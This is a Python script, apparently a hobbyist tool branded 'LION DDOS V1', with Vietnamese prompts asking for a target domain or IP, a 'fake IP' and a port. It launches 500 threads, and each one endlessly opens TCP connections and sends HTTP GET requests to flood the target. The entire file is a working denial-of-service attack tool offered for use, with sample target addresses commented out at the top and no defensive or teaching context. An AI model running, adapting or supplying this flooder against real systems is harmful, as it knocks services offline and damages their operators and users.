import socket
import threading 

#target_ip  = '195.20.52.179'
#fake_ip = '182.21.20.32'
#port = 80

print("\n\n")
print("         +-------------------------------------+")
print("      TIEN DAT VUONG DEP CHAI NHAT THE GIOI")

print("\n\n")

print("Điền IP Tên Miền :  ")
print("Điền IP TÊN MIỀN BẠN MUỐN DDOS DƯỚI ĐÂY - LION VERSION 1 (DEMO)'")
target = input("\t == > ")
print("ĐIỀN LẠI IP TÊN MIỀN BẠN MUỐN DDOS DƯỚI ĐÂY - LION VERSION 1 (DEMO)'  ")
fake_ip = input("\t\t ==> ")
print("NHẬP PORT NÊN CHỌN 443 - LION DDOS V1 (DEMO)")
port = input("\t\t ==> ")

port = int(port)

attack_num = 0

print("LION DDOS LOADING...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print("LION DDOS V1 GG => "+packesnum)
        print("Done")
        
        s.close()
print("Zalo 0792161421 ")
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


